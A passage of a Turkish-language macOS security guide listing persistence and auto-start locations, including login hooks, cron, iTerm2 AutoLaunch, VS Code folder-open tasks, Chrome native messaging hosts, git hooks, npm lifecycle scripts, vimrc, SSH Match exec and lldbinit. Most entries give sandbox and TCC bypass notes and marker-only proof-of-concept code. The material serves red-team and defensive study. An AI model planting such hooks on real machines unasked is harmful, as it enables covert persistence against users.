- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Exploitation

QuickLook eklentileri, **bir dosyanın önizlemesini tetiklediğinizde** (dosya Finder'da seçiliyken boşluk tuşuna basın) ve **bu dosya türünü destekleyen bir eklenti** yüklüyse çalıştırılabilir.<sup>[[8]](#references)</sup>

Kendi QuickLook eklentinizi derleyip yüklenmesi için önceki konumlardan birine yerleştirebilir, ardından desteklenen bir dosyaya gidip tetiklemek için boşluk tuşuna basabilirsiniz.

Bu yollar eski `.qlgenerator` paketlerini ifade eder; [Apple'ın Quick Look mimari kılavuzu](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html), arama sırasını ve eşleşen dosya türlerini açıklar. Güncel Quick Look **app extension**'ları bir uygulamayla birlikte paketlenir ve farklı kayıt ile çalıştırma kurallarına tabidir. Bir generator'ın mevcut olması, onun tür seçiminde öncelik kazanacağını veya kodunun doğrudan Finder içinde çalışacağını göstermez. Eski generator yolu, belgeler ve dizinlerin varlığı incelenerek doğrulandı; araştırma Mac'inde hiçbir generator yüklü değildi veya çalıştırılmadı.

### ~~Login/Logout Hook'ları~~

> [!CAUTION]
> Bu bende işe yaramadı; ne kullanıcı LoginHook'u ne de root LogoutHook'u.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir komutu çalıştırabilmeniz gerekir
  - `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur

Kullanımdan kaldırılmış olsalar da kullanıcı giriş yaptığında komut çalıştırmak için kullanılabilirler.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` konumunda saklanır.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Silmek için:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Root kullanıcısınınki **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** dosyasında saklanır

## Koşullu Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz. Bunlar, yalnızca **bir şeyi dosyaya yazarak** çalıştırmanıza ve belirli **programların yüklü olması**, kullanıcının **"alışılmadık"** eylemleri veya ortamlar gibi pek yaygın olmayan koşulların gerçekleşmesini **beklemenize** olanak tanır.

### Cron

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak `crontab` binary'sini çalıştırabilmeniz gerekir
  - Veya root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/usr/lib/cron/tabs/`**
  - Doğrudan yazma erişimi için root gerekir. `crontab <file>` komutunu çalıştırabiliyorsanız root gerekmez
  - **Tetikleyici**: Yüklü crontab'deki zamanlama. `at` ve `periodic` aşağıda ayrı mekanizmalar olarak ele alınmıştır.

#### Açıklama ve Exploitation

**Geçerli kullanıcının** cron job'larını şu komutla listeleyin:

```bash
crontab -l
```

Sistem cron daemon'ının launchd plist dosyasında `/usr/lib/cron/tabs` için bir `QueueDirectories` girdisi bulunur; yüklenmiş kullanıcı crontab'ları burada tutulur. Diğer kullanıcıların crontab'larını incelemek için root yetkisi gerekir:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Atılabilir bir hesapta, yalnızca işaretleyici içeren bir kullanıcı cron kaydı `crontab` ile eklenip gözlemlendikten sonra kaldırılabilir. `crontab <file>` **hesabın mevcut crontab'ının tamamını değiştirir**; hesap atılabilir değilse crontab'ı kaydedip geri yükleyin:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 daha önce verilmiş TCC izinlerini kullanabiliyordu

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Tetikleyici**: Bu klasörde uygun bir Python API script'i varken iTerm2'yi başlatmak
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Tetikleyici**: iTerm2'yi başlatmak; AppleScript başlangıç kancası ayrıca belgelenmiştir
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Tetikleyici**: Komutu veya başlangıç metni payload'ı çağıran profile sahip bir oturum oluşturmak

#### Açıklama ve Exploitation

[Güncel iTerm2 Python API kılavuzu](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts), `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` konumundaki otomatik çalışan **Python** script'lerini belgeliyor. Bu klasördeki rastgele bir yürütülebilir `.sh` dosyasının çalıştığını doğrulamıyor. Geçici bir hesapta bunu `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` olarak kaydedin:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[Güncel iTerm2 AppleScript kılavuzu](https://iterm2.com/documentation-scripting.html), `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` konumunu ayrıca belgeliyor; modern klasör yoksa eski `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` konumuna geri dönüyor. Yalnızca bir işaretleyici içeren AppleScript şöyledir:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Bu script örnekleri, etkin masaüstü oturumunda çalıştırılmak yerine iTerm2 belgelerine göre kontrol edildi. Atılabilir bir hesapta test ettikten sonra test scriptini ve sırasıyla `/tmp/ht-iterm-autolaunch-marker` veya `/tmp/iterm2-autolaunchscpt` dosyasını kaldırın.

**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumundaki iTerm2 tercihleri bir profil komutu veya başlangıç metni belirtebilir. İkincisi bir oturuma yazılır; çalıştırılması, onu yorumlayan bir kabuğa bağlıdır. [iTerm2'nin profil belgeleri](https://iterm2.com/documentation-preferences-profiles-general.html), bu profile sahip yeni bir oturum oluşturulduğunda çalıştırılan komutu açıklar.

Bu ayar iTerm2 ayarlarından yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komut tercihlere yansıtılır:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Güvenli bir değerlendirme için iTerm2 ayarlarında seçilen profili inceleyin veya tercih dosyasının bir kopyasını okuyun. Canlı bir profilde `Initial Text` değerini değiştirmek kullanıcının oturumlarını etkilerdi; bu nedenle araştırma Mac'inde hiçbir tercih değiştirilmedi.

### xbar

Yazı: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak xbar'ın kurulu olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility izinleri ister

#### Konum

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Popüler [**xbar**](https://github.com/matryer/xbar) programı kuruluysa, xbar başlatıldığında çalıştırılacak bir shell script'i **`~/Library/Application\ Support/xbar/plugins/`** içinde yazmak mümkündür:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox'i atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Hammerspoon kurulu olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Accessibility izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
  - **Tetikleyici**: Hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** otomasyon platformudur. Özellikle, tam AppleScript kodunun entegre edilmesini ve shell script'lerin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.<sup>[[13]](#references)</sup>

Uygulama tek bir dosyayı, `~/.hammerspoon/init.lua`, arar ve başlatıldığında bu script çalıştırılır.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Sandbox atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak BetterTouchTool kurulu olmalıdır
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
  - Automation-Shortcuts ve Accessibility izinlerini ister

#### Konum

- Etkin bir BetterTouchTool preset'i tarafından **zaten referans verilen** bir script dosyası veya `~/Library/Application Support/BetterTouchTool/` altındaki preset yapılandırması. Kesin script yolu, preset'in nasıl yapılandırıldığına bağlıdır.

[BetterTouchTool'un action referansı](https://docs.folivora.ai/docs/actions/action-definitions/) shell-script ve background-command action'larını açıklar. İlgili preset etkin durumdayken yapılandırılmış klavye, fare, dokunma, widget veya başka bir olay gerçekleşmelidir; [trigger kılavuzu](https://docs.folivora.ai/docs/configuration/new-trigger/) bu eşleşmeyi gösterir. Application-support dizinindeki rastgele bir dosya bir trigger değildir. Harici, yazılabilir bir script'i yükleyen önceden yapılandırılmış bir action, daha dar kapsamlı bir yazma-çalıştırma hedefidir. Kod, gerçek macOS izinlerine tabi olarak BetterTouchTool kullanıcısının hesabıyla çalışır. Araştırma Mac'inde BetterTouchTool `/Applications` altında yoktu; bu nedenle yerel olarak hiçbir preset değiştirilmedi veya çalıştırılmadı.

### Alfred

- Sandbox atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Alfred kurulu olmalıdır
- TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
  - Automation, Accessibility ve hatta Full-Disk erişim izinlerini ister

#### Konum

- Kurulu bir Alfred workflow tarafından **zaten referans verilen** bir script veya dosya ya da kullanıcının yapılandırdığı `Alfred.alfredpreferences` dizini içindeki workflow. Preferences dizini eşitlenebilir ve sabit, evrensel bir yolu yoktur.

[Alfred'in workflow kılavuzu](https://www.alfredapp.com/help/workflows/) Powerpack gereksinimini ve arayüz üzerinden kurulumu açıklar. Kurulu bir workflow'un hotkey'i, keyword'ü veya yapılandırılmış başka bir trigger'ı çalışmalıdır; [Alfred'in hotkey örneği](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) bir script action'ı gösterir. [Alfred'in ortam referansı](https://www.alfredapp.com/help/workflows/script-environment-variables/) seçili preferences yolunu `alfred_preferences` olarak sunar. Kayıtlı olmayan bir workflow dosyasını rastgele bir dizine bırakmak, onun kurulacağını veya çalıştırılacağını kanıtlamaz. Kod, gerçek macOS izinleriyle oturum açmış Alfred kullanıcısı olarak çalışır. Araştırma Mac'inde Alfred `/Applications` altında yoktu; bu nedenle bu yol yalnızca belgelere göre değerlendirildi.

### Raycast Script Commands ve extension yenileme

- **Yazma hedefi:** Raycast Settings → Script Commands altında **zaten eklenmiş** bir dizindeki çalıştırılabilir script. Raycast, rastgele oluşturulan yeni bir dizini taramaz. [Raycast'in Script Commands kılavuzu](https://manual.raycast.com/script-commands) dizin kaydını açıklar.
- **Trigger ve kimlik:** Kullanıcı indekslenmiş komutu çalıştırır, yapılandırılmış bir hotkey veya fallback komutu çalıştırır ya da Raycast, yapılandırılmış `@raycast.refreshTime` değerine göre bir `inline` script'i yeniler. Script, oturum açmış Raycast kullanıcısı olarak kendi interpreter'ı aracılığıyla çalışır. [Upstream metadata referansı](https://github.com/raycast/script-commands#metadata) otomatik yenilemeyi yalnızca inline komutlarla sınırlar; [Raycast'in extension manifest'i](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) ayrıca kurulu `no-view` veya `menu-bar` extension komutları için bir `interval` destekler. Normal bir script command eklemek, onu zamanlanmış hâle getirmez.

Kayıtlı bir script dizini olan, test amaçlı geçici bir hesapta yalnızca işaretleyici oluşturan bir inline script şöyledir:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Dosyayı kayıtlı dizine kaydedin, çalıştırılabilir hâle getirin ve Raycast'in yenilemesine izin verin. Ardından bu dosyayı ve `/tmp/ht-raycast-refresh-marker` dosyasını silin. Araştırma Mac'inde Raycast, `/Applications` altındaki olağan adıyla bulunamadı; bu nedenle bu işlem belgelerle desteklenmektedir ve yerel olarak çalıştırılmamıştır. Accessibility, Automation ve dosya izinleri macOS izin istemlerine tabidir.

### Visual Studio Code otomatik çalışma alanı görevleri

- **Yazma hedefi:** Kullanıcının açacağı bir çalışma alanının içindeki `.vscode/tasks.json`.
- **Tetikleyici:** VS Code'da bu çalışma alanını açmak; ancak yalnızca klasör güvenilir **ve** otomatik görevlere izin verilmişse. Güvenilmeyen bir çalışma alanı otomatik görevleri hiçbir zaman çalıştırmaz; varsayılan ayar, ilk otomatik çalıştırmadan önce kullanıcıya sorar. [VS Code görev belgeleri](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) ve [Workspace Trust belgeleri](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) bu iki koşulu da açıklar.
- **Çalıştırma kimliği:** Yapılandırılmış görev süreci aracılığıyla VS Code kullanıcısının hesabı. Bu, oturum açılışında kalıcılık değil, uygulamaya özgü bir çalıştırmadır.

**Yeni, geçici bir çalışma alanında**, yalnızca işaretçi oluşturan bu görevi `.vscode/tasks.json` içine yerleştirin:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Güvenilen çalışma alanını açıp otomatik görevlere izin verdikten sonra `.autostart-task-ran` dosyasını kontrol edin. Temizlemek için görev girdisini ve işaretçi dosyasını kaldırın. **Bu, Microsoft'un belgeleri ve yüklü VS Code 1.139.1 paketi temel alınarak doğrulandı; etkin masaüstü oturumunda çalıştırılmadı.**

### Chrome native messaging hosts

- **Yazma hedefi:** Geçerli kullanıcı için `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` veya tüm kullanıcılar için `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` (yönetici yazma izni gerekir). Chromium ve Chrome for Testing farklı dizinler kullanır; [Chrome'un güncel yol tablosuna](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location) bakın.
- **Tetikleyici:** `nativeMessaging` iznine sahip yüklü bir Chrome uzantısı, manifestteki tam host adını kullanarak `chrome.runtime.connectNative()` veya `chrome.runtime.sendNativeMessage()` çağrısı yapar. Bunun ardından Chrome, host yürütülebilir dosyasını başlatır. Yalnızca Chrome'u açmak, keyfi bir yeni native host'u çalıştırmaz; çağrı yapan bir uzantı olmadan manifest oluşturmak hiçbir şey yapmaz. [Chrome'un native messaging kılavuzu](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) bu el sıkışma sürecini açıklar.
- **Yürütme kimliği:** Chrome kullanıcısının hesabı. Manifestte mutlak bir yürütülebilir dosya yolu belirtilmeli ve çağrı yapan uzantının origin'ine açıkça izin verilmelidir.

Test uzantısı bulunan, kullanım dışı bırakılabilir bir tarayıcı hesabında aşağıdaki iki dosya, yazmadan yürütmeye giden bağlantıyı gösterir. Manifestin dosya adı `name` değeriyle eşleşmeli ve `TEST_EXTENSION_ID`, uzantının gerçek kimliğiyle değiştirilmelidir:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Bu JSON'u `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` olarak kaydedin. Manifestteki `path` alanında belirtilen yalnızca işaretleyici içeren yürütülebilir dosya şunları içerebilir:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Test extension, service worker'ından veya extension sayfasından `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` çağrısını yaptıktan sonra, işaretçi host'un başlatıldığını kanıtlar. Bu minimal host, Chrome'un uzunluk önekli yanıt protokolünü uygulamaz; bu nedenle işaretçi yazıldıktan sonra extension bir mesajlaşma hatası bildirebilir. Temizlemek için test manifestini, host'u ve işaretçiyi kaldırın. macOS 26.5.2'de Chrome uygulaması ve her iki manifest dizini mevcuttu; **etkin Chrome profiline dokunulmadı ve profil kullanılmadı**.

### Karabiner-Elements tuş olayı komutları

- **Yazma hedefi:** Karabiner-Elements'in kurulu ve çalışır durumda olduğu bir hesaptaki `~/.config/karabiner/karabiner.json`. [Karabiner'ın dosya konumu kılavuzu](https://karabiner-elements.pqrs.org/docs/json/location/), uygulamanın yazma işleminden sonra bu dosyayı izleyip yeniden yüklediğini belirtir. `assets/complex_modifications` içindeki JSON dosyaları yalnızca içe aktarılabilir hazır ayarlardır; oraya yalnızca dosya yazmak bir kuralı etkinleştirmez.
- **Tetikleyici:** Kural etkinleştikten sonra yapılandırılan tuş olayı. [`to.shell_command` referansı](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/), komut yürütmeyi belgelendirir. Bu, oturum açıldığında veya her dosya yazımında kod yürütülmesi değildir.
- **Yürütme kimliği:** Karabiner'ın kullanıcı sürecini çalıştıran oturum açmış kullanıcı. Uygulamanın kendi izinleri ve TCC erişimi, uygulamaya ve sürüme bağlıdır.

Tek kullanımlık bir test hesabı için, profilin geri kalanını koruyarak bu kural nesnesini `karabiner.json` içindeki seçili profilin `complex_modifications.rules` dizisine ekleyin. Zararsız bir işaretçi oluşturmak için F18'e basın, ardından bu kuralı ve işaretçiyi kaldırın. F18'i seçmek, sıradan bir yazma tuşunun yerini almaktan kaçınır:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements macOS 26.5.2 test makinesinde `/Applications` dizinine yüklenmemişti; bu nedenle bu, yerel bir çalışma zamanı sonucu değil, belgelerle desteklenen bir PoC'dir.

### Yerel bir depodaki Git hooks

- **Yazma hedefi:** `<repo>/.git/hooks/post-checkout` gibi yürütülebilir bir hook. `core.hooksPath` önceden ayarlanmışsa bunun yerine yapılandırılmış dizini kullanın. Normal bir izlenen kaynak dosya olarak commit edilen bir hook, clone işlemine otomatik olarak yüklenmez.
- **Tetikleyici:** İlgili Git işlemi. Örneğin `post-checkout`, `git checkout` veya `git switch` sonrasında çalışır; ayrıca clone ya da worktree oluşturma sonrasında da çalışabilir. [Git'in hook referansı](https://git-scm.com/docs/githooks) olayları ve yürütülebilir dosya biti gereksinimini listeler; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) arama dizinini değiştirir.
- **Yürütme kimliği:** Git'i çalıştıran hesap. Hook yalnızca deponun etkin hooks dizini aktör tarafından yazılabilir durumdaysa ve kullanıcı daha sonra ilgili Git işlemini gerçekleştirirse yürütülebilir.

Bu yalnızca işaretleyici oluşturan PoC, tamamen geçici bir depo oluşturur, bir hook yükler ve bir branch'e geçiş yapar. macOS 26.5.2 üzerinde Apple Git 2.50.1 ile başarıyla yürütülmüştür:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Bir projedeki npm lifecycle scripts

- **Yazma hedefi:** Yazılabilir bir projenin `package.json` dosyasındaki `scripts` map'i veya kullanıcının lifecycle script'ini çalıştıracağı kurulu bir dependency paketi. Bu, bir dizini açmakla gerçekleşen bir çalıştırma değil, geliştirme iş akışına yönelik bir hook'tur.
- **Tetikleyici ve kimlik:** Lifecycle script'lerine izin verilen sonraki bir `npm install` veya `npm ci` komutu, `preinstall`, `install` ve `postinstall` script'lerini npm'i çağıran kullanıcı olarak çalıştırır. Sıradan bir `npm run <name>` komutu da eşleşen `pre<name>` ve `post<name>` script'lerini çalıştırır. [npm'nin lifecycle referansı](https://docs.npmjs.com/cli/v11/using-npm/scripts) olayları listeler; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) install lifecycle script'lerini devre dışı bırakabilir. Sürüm ve ilke ayarları izin verilenleri değiştirebilir; bu nedenle hedef npm sürümünü kontrol edin.

Bu yalnızca işaretleyici kullanan PoC, yerel npm ile geçici ve boş bir dizinde çalıştırıldı. Bağımlılık indirmez veya kullanıcının projesini değiştirmez:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Bu, Python interpreter başlangıç dosyalarından farklıdır: npm'in ilgili install veya run eylemini gerçekleştirmesi gerekirken, Python `site` kodu olağan bir interpreter çağrısında yüklenebilir. Genel `Makefile` hedefleri ve build task tanımları da benzer şekilde, kullanıcının veya önceden yapılandırılmış bir aracın bu hedefi çağırmasını gerektirir; bunlar ayrı OS auto-start yolları değildir.

### Vim startup configuration

- **Write target:** Vim'i başlatacak kullanıcı için `~/.vimrc` (veya Vim'in başlatma sırasına göre seçilen başka bir başlangıç dosyası). [Vim'in başlangıç referansı](https://vimhelp.org/starting.txt.html) dosyayı ve `VIMINIT`/`EXINIT` override'larını belgeler.
- **Trigger:** Bu yapılandırmayı yükleyen sonraki olağan Vim başlangıcı. Vim'in `-u NONE` seçeneği kullanıcı vimrc dosyasını atlar. Bu, OS login trigger'ı değil, editöre özgü bir çalıştırmadır.
- **Execution identity:** Vim kullanıcısının hesabı.

Aşağıdaki izole PoC, macOS'un `/usr/bin/vim` dosyasıyla çalıştırıldı; gerçek Vim tercihlerini veya açık belgeleri yazmaz:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim'in ayrı bir kullanıcı yapılandırma yolu vardır: `$XDG_CONFIG_HOME/nvim/init.lua` veya `init.vim`. Ayrıca [başlangıç belgelerine](https://neovim.io/doc/user/starting/) göre `plugin/` runtime dizinlerindeki script'leri de yükler. Neovim, macOS 26.5.2 test makinesine kurulu olmadığından bu varyant orada çalıştırılmadı.

### SSH client yapılandırma komutları

- **Yazma hedefi:** `~/.ssh/config` veya bu dosyanın zaten include ettiği başka bir dosya. Bu bir **client** yapılandırma dosyasıdır; aşağıda açıklanan server tarafındaki `~/.ssh/rc` dosyasından ayrıdır.
- **Tetikleyici:** Eşleşen bir `ssh` çağrısı. `Match exec`, client yapılandırmasını değerlendirirken yerel bir komut çalıştırır; buna bağlantı kurmadan yapılandırmayı yazdıran `ssh -G` de dahildir. `ProxyCommand`, client eşleşen bir bağlantı kurarken çalışır. `LocalCommand` yalnızca başarılı bir bağlantıdan sonra çalışır ve `PermitLocalCommand yes` gerektirir (varsayılan değer `no`'dur). Bunların çalışma zamanları ve önkoşulları farklıdır; tek başına dosyaya yazmak bunları çalıştırmaz. Upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) belgesine bakın.
- **Çalıştırma kimliği:** `ssh` çalıştıran yerel kullanıcı. Eşleşen bir host, geçerli bir yapılandırma dosyası ve gereken bağlantı koşulları sağlanmalıdır. `ssh -F` farklı bir yapılandırma dosyası seçebilir.

Yalnızca marker içeren bu PoC, macOS 26.5.2'de Apple'ın SSH client'ı ile çalıştırıldı. `-G`, ağ bağlantısı kurmadan veya kullanıcının gerçek SSH yapılandırmasını okumadan `Match exec` özelliğini kullanır:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger başlatma dosyaları

- **Yazma hedefi:** `~/.lldbinit` veya `~/.lldbinit-lldb` gibi daha yüksek öncelikli, uygulamaya özel dosya. LLDB, debugger başlatılırken bu dosyalardan birini okur. Geçerli dizindeki `.lldbinit` varsayılan olarak **çalıştırılmaz**; kullanıcının `target.load-cwd-lldbinit` seçeneğini etkinleştirmesi veya `--local-lldbinit` parametresini geçmesi gerekir. [LLDB kılavuzuna](https://lldb.llvm.org/man/lldb.html) bakın.
- **Tetikleyici ve kimlik:** Kullanıcı LLDB’yi `--no-lldbinit` olmadan başlatır; komutlar bu kullanıcı olarak çalışır. Bir projeyi açmak, projenin `.lldbinit` dosyasının çalıştırılacağı anlamına gelmez.

Aşağıdaki yalnızca işaretleyici içeren test, yalıtılmış bir ana dizin ve çalışma diziniyle macOS 26.5.2 üzerinde LLDB’ye karşı çalıştırıldı:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [upstream başlangıç belgeleri](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) macOS'ta önce `$HOME/Library/Preferences/gdb/gdbinit` konumunu, ardından `~/.gdbinit` konumunu listeler. Geçerli dizindeki `.gdbinit`, [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html) kuralına tabidir ve `-nx`/`-nh` başlatma dosyalarını devre dışı bırakır. Test Mac'inde GDB yüklü olmadığından bu varyant yerel olarak çalıştırılmadı.

### SSHRC

Yazı: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak ssh'nin etkinleştirilmiş ve kullanılıyor olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH kullanımı FDA erişimi sağlar

#### Konum

- **`~/.ssh/rc`**
  - **Tetikleyici**: ssh üzerinden giriş
- **`/etc/ssh/sshrc`**
  - Root gerekir
  - **Tetikleyici**: ssh üzerinden giriş

> [!CAUTION]
> ssh'yi açmak için Full Disk Access gerekir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve Exploitation

Varsayılan olarak, `/etc/ssh/sshd_config` dosyasında `PermitUserRC no` ayarı yoksa, kullanıcı **SSH üzerinden oturum açtığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** betikleri çalıştırılır.<sup>[[14]](#references)</sup>

### **Giriş Öğeleri**

